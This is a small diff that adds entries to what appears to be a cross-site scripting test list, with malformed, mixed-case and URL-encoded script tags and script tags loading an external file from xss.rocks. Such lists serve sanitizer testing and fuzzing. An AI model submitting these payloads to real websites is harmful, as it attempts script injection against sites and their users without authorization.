@@ -4,4 +4,9 @@
 <script></scripting>
 << ScRiPT >alert (”XSS”);//<</ ScRiPT >
 <script></script>
+<script src=http://xss.rocks/xss_error.js ></script>
 <SCRIPT SRC=http://xss.rocks/xss_error.js></SCRIPT>
+<script></script
+<script><script></script></script>
+script></script>
+%3Cscript%3E%3C%2Fscript%3E
